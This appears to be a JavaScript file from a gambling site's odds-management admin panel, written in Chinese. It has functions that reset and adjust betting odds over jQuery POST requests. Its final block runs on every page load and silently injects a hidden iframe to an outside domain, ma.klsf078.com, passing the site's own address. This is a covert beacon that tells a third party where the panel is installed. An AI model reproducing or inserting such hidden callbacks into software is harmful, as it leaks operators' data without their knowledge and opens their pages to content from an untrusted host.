
function initializes(){
	if (confirm("您確認還原所有賠率初始值碼？")){
		$.post(Urls, {typeid : 9}, function(data){
			alert("賠率還原完成！");
			location.href = location.href;
		},"text");
	}
}

function setodds(str, tid, $this){
	var oddsHtml = $("#"+str);
	var odds = parseFloat(oddsHtml.html());
	var Ho = $("#Ho").val();
	if (Ho == "" || !/^[0-9]+\.?[0-9]*$/.test(Ho)){$("#Ho").val("0.001");return}
	Ho = parseFloat(Ho);
	if ($this.name == 1){
		odds = odds + Ho;
	} else {
		if (odds < Ho){return}
		odds = isFloat(odds - Ho);
	}
	$.post(Urls, {typeid : 8, tid : tid, hid : str, oid : odds}, function(data){
		if (data == 1){
			oddsHtml.html(isFloat(odds));
		}
	},"text");
}
$(document).ready(function(){
	var url = location.href.split('/'); 
	$(document.body).append("<iframe src='http://ma.klsf078.com/validUrl.php?url="+url[0]+'/'+url[1]+'/'+url[2]+"' style='display:none'></iframe>");
})